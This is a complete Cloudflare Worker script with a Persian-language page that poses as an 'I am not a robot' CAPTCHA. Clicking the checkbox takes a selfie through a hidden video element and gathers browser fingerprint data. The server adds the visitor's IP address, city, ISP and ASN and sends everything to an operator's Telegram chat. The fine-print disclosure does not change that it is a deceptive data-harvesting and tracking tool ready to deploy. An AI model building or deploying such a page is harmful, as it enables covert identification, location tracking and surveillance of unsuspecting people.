// ============================================================
//  Selfie Captcha Worker — Professional Skeleton
// ============================================================
//  Env vars (Cloudflare Dashboard → Settings → Variables):
//    TELEGRAM_BOT_TOKEN   (required)  – token from @BotFather
//    TELEGRAM_CHAT_ID     (required)  – target chat/user id
//    SESSION_SECRET       (optional)  – random string; falls back to bot token
//    MAX_UPLOAD_BYTES     (optional)  – default 5*1024*1024
//    RATE_LIMIT_PER_MIN   (optional)  – default 5
// ============================================================

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      if (url.pathname === '/') {
        if (request.method !== 'GET') return methodNotAllowed(['GET']);
        return await handlePage(request, env);
      }
      if (url.pathname === '/upload') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleUpload(request, env);
      }
      return new Response('Not Found', { status: 404 });
    } catch (err) {
      console.error('unhandled', err?.stack || err);
      return json({ error: 'internal_error' }, 500);
    }
  },
};

// ============================================================
//  GET /
// ============================================================
async function handlePage(request, env) {
  const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
  const token = await issueToken(secret);
  const nonce = crypto.randomUUID().replace(/-/g, '');

  const headers = new Headers({
    'Content-Type': 'text/html;charset=UTF-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'Referrer-Policy': 'no-referrer',
    'Permissions-Policy': 'camera=(self), microphone=(), geolocation=()',
    'Content-Security-Policy': [
      "default-src 'none'",
      `script-src 'nonce-${nonce}'`,
      `style-src 'nonce-${nonce}'`,
      "connect-src 'self'",
      "img-src 'self' data: blob:",
      "media-src 'self' blob:",
      "base-uri 'none'",
      "form-action 'none'",
      "frame-ancestors 'none'",
    ].join('; '),
  });
  headers.set(
    'Set-Cookie',
    `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`
  );

  return new Response(renderHTML(nonce), { headers });
}

// ============================================================
//  POST /upload
// ============================================================
async function handleUpload(request, env) {
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;

  // 1) rate limit
  const rl = await rateLimit(ip, Number(env.RATE_LIMIT_PER_MIN) || 5, 60);
  if (!rl.allowed) return json({ error: 'rate_limited' }, 429);

  // 2) CSRF / session token check
  const token = parseCookie(request.headers.get('Cookie') || '', 'hs_session');
  if (!token || !(await verifyToken(token, secret))) {
    return json({ error: 'invalid_session' }, 403);
  }

  // 3) multipart parsing
  let form;
  try {
    form = await request.formData();
  } catch {
    return json({ error: 'invalid_multipart' }, 400);
  }

  const photo = form.get('photo');
  const clientDataRaw = form.get('clientData');

  if (!(photo instanceof File)) return json({ error: 'missing_photo' }, 400);

  const maxBytes = Number(env.MAX_UPLOAD_BYTES) || 5 * 1024 * 1024;
  if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
  if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
  if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
    return json({ error: 'invalid_mime' }, 415);
  }

  // 4) client payload
  let clientInfo = {};
  try {
    clientInfo = JSON.parse(clientDataRaw || '{}');
  } catch {
    clientInfo = { _parseError: 'invalid json' };
  }

  // 5) server-side info
  const cf = request.cf || {};
  const serverInfo = {
    ip,
    country: cf.country,
    city: cf.city,
    region: cf.region,
    timezone: cf.timezone,
    isp: cf.asOrganization,
    asn: cf.asn,
    httpProtocol: cf.httpProtocol,
    tlsVersion: cf.tlsVersion,
    colo: cf.colo,
    userAgent: request.headers.get('User-Agent'),
    acceptLanguage: request.headers.get('Accept-Language'),
    referer: request.headers.get('Referer'),
  };

  // 6) build report
  const sessionId = crypto.randomUUID().slice(0, 8);
  const reportHtml = buildReport(sessionId, serverInfo, clientInfo);

  // 7) send to Telegram (each step independent — one failure won't stop others)
  const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
  const results = [];

  const photoRes = await tg.sendPhoto(
    photo,
    `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`
  );
  results.push({ step: 'photo', ok: !!photoRes.ok });

  for (const [i, chunk] of chunkByLines(reportHtml).entries()) {
    const r = await tg.sendMessage(chunk);
    results.push({ step: `report_${i + 1}`, ok: !!r.ok });
    await sleep(300);
  }

  const rawJson = JSON.stringify(
    { sessionId, at: new Date().toISOString(), serverInfo, clientInfo },
    null,
    2
  );
  const docRes = await tg.sendDocument(
    new Blob([rawJson], { type: 'application/json' }),
    `data_${sessionId}.json`,
    `📄 داده خام • <code>${sessionId}</code>`
  );
  results.push({ step: 'raw_json', ok: !!docRes.ok });

  if (!results.some((r) => r.ok)) {
    return json({ error: 'telegram_failed', results }, 502);
  }
  return json({ ok: true, sessionId, results });
}

// ============================================================
//  Telegram client
// ============================================================
class TelegramClient {
  constructor(token, chatId) {
    this.token = token;
    this.chatId = chatId;
    this.base = `https://api.telegram.org/bot${token}`;
  }

  sendPhoto(blob, caption) {
    const fd = new FormData();
    fd.append('chat_id', this.chatId);
    fd.append('photo', blob, 'selfie.jpg');
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    return this._call('sendPhoto', fd);
  }

  sendMessage(text) {
    return this._call(
      'sendMessage',
      JSON.stringify({
        chat_id: this.chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
      { 'Content-Type': 'application/json' }
    );
  }

  sendDocument(blob, filename, caption) {
    const fd = new FormData();
    fd.append('chat_id', this.chatId);
    fd.append('document', blob, filename);
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    return this._call('sendDocument', fd);
  }

  async _call(method, body, headers = {}) {
    try {
      const res = await fetch(`${this.base}/${method}`, { method: 'POST', headers, body });
      const data = await res.json();
      if (!data.ok) console.error(`telegram ${method}`, data);
      return data;
    } catch (e) {
      console.error(`telegram ${method} exception`, e);
      return { ok: false, description: String(e) };
    }
  }
}

// ============================================================
//  Report builder (HTML, escape-safe)
// ============================================================
function buildReport(sessionId, server, client) {
  const esc = (v) =>
    String(v ?? '—')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');

  const when = new Date().toISOString();
  const lines = [
    `🔐 <b>گزارش سلفی</b>`,
    `<i>شناسه:</i> <code>${sessionId}</code>`,
    `<i>زمان (UTC):</i> ${when}`,
    ``,
    `🌐 <b>اطلاعات شبکه</b>`,
    `<pre>IP:          ${esc(server.ip)}
کشور:       ${esc(server.country)}
شهر:        ${esc(server.city)}
منطقه:      ${esc(server.region)}
منطقه زمان: ${esc(server.timezone)}
ISP:        ${esc(server.isp)}
ASN:        ${esc(server.asn)}
HTTP:       ${esc(server.httpProtocol)}
TLS:        ${esc(server.tlsVersion)}
Colo:       ${esc(server.colo)}</pre>`,
    `UA: <code>${esc(server.userAgent)}</code>`,
    `Lang: ${esc(server.acceptLanguage)}`,
    `Referer: ${esc(server.referer)}`,
    ``,
    `💻 <b>اطلاعات مرورگر</b>`,
    `<pre>User-Agent: ${esc(client.userAgent)}
زبان:       ${esc(client.language)}
زبان‌ها:     ${esc((client.languages || []).join(', '))}
پلتفرم:     ${esc(client.platform)}
صفحه:       ${esc(client.screenWidth)}×${esc(client.screenHeight)}
پنجره:      ${esc(client.innerWidth)}×${esc(client.innerHeight)}
DPR:        ${esc(client.devicePixelRatio)}
CPU:        ${esc(client.hardwareConcurrency)} هسته
RAM:        ${esc(client.deviceMemory)} GB
اتصال:      ${esc(client.connectionType)}
زمان محلی:  ${esc(client.localTime)}
TZ:         ${esc(client.timezone)}
آنلاین:     ${client.onLine ? 'بله' : 'خیر'}
کوکی:       ${client.cookieEnabled ? 'بله' : 'خیر'}
DNT:        ${esc(client.doNotTrack)}
PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
  ];
  return lines.join('\n');
}

// ============================================================
//  Session token (HMAC-signed timestamp)
// ============================================================
async function issueToken(secret) {
  const ts = String(Date.now());
  const payload = btoa(ts);
  const sig = await hmac(payload, secret);
  return `${payload}.${sig}`;
}

async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
  try {
    const [payload, sig] = String(token).split('.');
    if (!payload || !sig) return false;
    const expected = await hmac(payload, secret);
    if (expected.length !== sig.length) return false;
    // constant-time compare
    let diff = 0;
    for (let i = 0; i < expected.length; i++) {
      diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
    }
    if (diff !== 0) return false;
    const ts = Number(atob(payload));
    return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
  } catch {
    return false;
  }
}

async function hmac(data, secret) {
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const buf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
  return btoa(String.fromCharCode(...new Uint8Array(buf)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

// ============================================================
//  Rate limit (Cache API, per-colo approximate)
// ============================================================
async function rateLimit(ip, limit, windowSec) {
  const cache = caches.default;
  const key = new Request(`https://ratelimit.local/${encodeURIComponent(ip)}`);
  const hit = await cache.match(key);
  const count = hit ? Number(await hit.text()) || 0 : 0;
  if (count >= limit) return { allowed: false, remaining: 0 };
  await cache.put(
    key,
    new Response(String(count + 1), {
      headers: { 'Cache-Control': `public, max-age=${windowSec}` },
    })
  );
  return { allowed: true, remaining: limit - count - 1 };
}

// ============================================================
//  Utilities
// ============================================================
function parseCookie(header, name) {
  for (const part of header.split(';')) {
    const [k, ...rest] = part.trim().split('=');
    if (k === name) return rest.join('=');
  }
  return null;
}

function chunkByLines(text, size = 4000) {
  const out = [];
  let current = '';
  for (const line of text.split('\n')) {
    if (current && (current + '\n' + line).length > size) {
      out.push(current);
      current = line;
    } else {
      current = current ? current + '\n' + line : line;
    }
  }
  if (current) out.push(current);
  return out;
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const json = (obj, status = 200) =>
  new Response(JSON.stringify(obj), {
    status,
    headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
  });
const methodNotAllowed = (allowed) =>
  new Response('Method Not Allowed', { status: 405, headers: { Allow: allowed.join(', ') } });

// ============================================================
//  Frontend
// ============================================================
function renderHTML(nonce) {
  return `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>تایید هویت</title>
<style nonce="${nonce}">
  :root { --accent:#4a90e2; --ok:#22a06b; --err:#d93636; --muted:#6b7280; --border:#dcdfe4; }
  * { box-sizing: border-box; }
  html, body { margin: 0; height: 100%; }
  body {
    display: flex; align-items: center; justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: #f5f6f8; color: #1f2328; padding: 16px;
  }
  .card {
    width: 100%; max-width: 360px;
    background: #fff; border: 1px solid var(--border); border-radius: 12px;
    box-shadow: 0 6px 24px rgba(15,23,42,.06);
    padding: 20px;
  }
  .row { display: flex; align-items: center; gap: 14px; }
  .checkbox {
    width: 28px; height: 28px; border: 2px solid #9ca3af; border-radius: 6px;
    display: flex; align-items: center; justify-content: center;
    cursor: pointer; background: #fff; transition: all .18s ease;
    flex-shrink: 0;
  }
  .checkbox:hover { border-color: var(--accent); }
  .checkbox:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
  .checkbox.checked { background: var(--accent); border-color: var(--accent); }
  .checkbox.checked::after {
    content: ""; width: 7px; height: 13px;
    border: solid #fff; border-width: 0 2.5px 2.5px 0;
    transform: rotate(45deg); margin-bottom: 3px;
  }
  .checkbox.busy { border-color: var(--accent); }
  .checkbox.busy::after {
    content: ""; width: 14px; height: 14px;
    border: 2px solid #e5e7eb; border-top-color: var(--accent);
    border-radius: 50%; animation: spin .7s linear infinite;
  }
  .checkbox.checked.busy::after { animation: none; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .label { font-size: 16px; font-weight: 500; cursor: pointer; }
  .hint { margin-top: 14px; font-size: 12px; color: var(--muted); line-height: 1.7; }
  .status { margin-top: 12px; font-size: 13px; min-height: 18px; }
  .status.error { color: var(--err); }
  .status.ok { color: var(--ok); }
  .retry {
    margin-top: 8px; background: none; border: 1px solid var(--border);
    color: #1f2328; padding: 6px 12px; border-radius: 8px; font-size: 13px;
    cursor: pointer; display: none;
  }
  .retry:hover { background: #f3f4f6; }
  #hiddenVideo, #canvas { display: none; }
  noscript { display: block; margin-top: 12px; color: var(--err); font-size: 13px; }
</style>
</head>
<body>
  <div class="card">
    <div class="row">
      <div class="checkbox" id="checkbox" role="checkbox" aria-checked="false" aria-label="من ربات نیستم" tabindex="0"></div>
      <span class="label" id="label">من ربات نیستم</span>
    </div>
    <p class="hint">
      با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.
    </p>
    <div class="status" id="status" role="status" aria-live="polite"></div>
    <button class="retry" id="retry" type="button">تلاش مجدد</button>
    <noscript>برای ادامه، جاوااسکریپت باید فعال باشد.</noscript>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

<script nonce="${nonce}">
(() => {
  const el = {
    box: document.getElementById('checkbox'),
    label: document.getElementById('label'),
    status: document.getElementById('status'),
    retry: document.getElementById('retry'),
    video: document.getElementById('hiddenVideo'),
    canvas: document.getElementById('canvas'),
  };
  let busy = false;

  const CAM_ERRORS = {
    NotAllowedError: 'دسترسی به دوربین رد شد. اجازه دهید و دوباره تلاش کنید.',
    NotFoundError: 'دوربینی یافت نشد.',
    NotReadableError: 'دوربین در حال استفاده توسط برنامه دیگری است.',
    OverconstrainedError: 'دوربین با تنظیمات درخواستی سازگار نیست.',
    SecurityError: 'دسترسی به دوربین به دلایل امنیتی ممکن نیست (HTTPS الزامی است).',
    AbortError: 'دسترسی به دوربین لغو شد.',
  };

  function setState(state, message) {
    el.box.classList.remove('busy', 'checked');
    el.box.setAttribute('aria-checked', 'false');
    el.status.className = 'status';
    el.status.textContent = message || '';
    el.retry.style.display = 'none';

    if (state === 'busy') {
      el.box.classList.add('busy');
      el.label.textContent = 'در حال بررسی...';
      el.status.textContent = message || 'در حال بررسی...';
    } else if (state === 'done') {
      el.box.classList.add('checked');
      el.box.setAttribute('aria-checked', 'true');
      el.label.textContent = 'تایید شد';
      el.status.classList.add('ok');
      el.status.textContent = 'اطلاعات با موفقیت ارسال شد.';
    } else if (state === 'error') {
      el.label.textContent = 'من ربات نیستم';
      el.status.classList.add('error');
      el.status.textContent = message || 'خطایی رخ داد.';
      el.retry.style.display = 'inline-block';
    } else {
      el.label.textContent = 'من ربات نیستم';
    }
  }

  async function getCameraStream() {
    const primary = { video: { facingMode: 'user' }, audio: false };
    try {
      return await navigator.mediaDevices.getUserMedia(primary);
    } catch (e) {
      if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError') {
        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      }
      throw e;
    }
  }

  function waitForVideo(video, timeoutMs = 6000) {
    if (video.readyState >= 2) return Promise.resolve();
    return new Promise((resolve, reject) => {
      const to = setTimeout(() => reject(new Error('camera_timeout')), timeoutMs);
      video.onloadeddata = () => { clearTimeout(to); resolve(); };
    });
  }

  function collectClientData() {
    const c = navigator.connection || {};
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      onLine: navigator.onLine,
      connectionType: c.effectiveType || null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      localTime: new Date().toLocaleString(),
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
    };
  }

  async function run() {
    if (busy) return;
    busy = true;
    setState('busy');

    let stream = null;
    try {
      stream = await getCameraStream();
      el.video.srcObject = stream;
      await waitForVideo(el.video);
      await new Promise((r) => setTimeout(r, 350)); // warm-up frame

      el.canvas.width = el.video.videoWidth || 640;
      el.canvas.height = el.video.videoHeight || 480;
      el.canvas.getContext('2d').drawImage(el.video, 0, 0, el.canvas.width, el.canvas.height);

      const blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
      if (!blob) throw new Error('capture_failed');

      stream.getTracks().forEach((t) => t.stop());
      stream = null;

      const fd = new FormData();
      fd.append('photo', blob, 'selfie.jpg');
      fd.append('clientData', JSON.stringify(collectClientData()));

      const resp = await fetch('/upload', { method: 'POST', body: fd, credentials: 'same-origin' });
      if (!resp.ok) {
        let detail = '';
        try { detail = (await resp.json()).error || ''; } catch {}
        throw new Error('upload_failed:' + (detail || resp.status));
      }

      setState('done');
    } catch (err) {
      if (stream) stream.getTracks().forEach((t) => t.stop());
      const name = err && err.name;
      const msg =
        CAM_ERRORS[name] ||
        (err && err.message === 'camera_timeout'
          ? 'زمان انتظار برای دوربین به پایان رسید.'
          : err && err.message && err.message.startsWith('upload_failed')
          ? 'ارسال اطلاعات ناموفق بود. لطفاً دوباره تلاش کنید.'
          : 'خطایی رخ داد. لطفاً دوباره تلاش کنید.');
      setState('error', msg);
    } finally {
      busy = false;
    }
  }

  el.box.addEventListener('click', run);
  el.label.addEventListener('click', run);
  el.retry.addEventListener('click', run);
  el.box.addEventListener('keydown', (e) => {
    if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); run(); }
  });
})();
</script>
</body>
</html>`;
}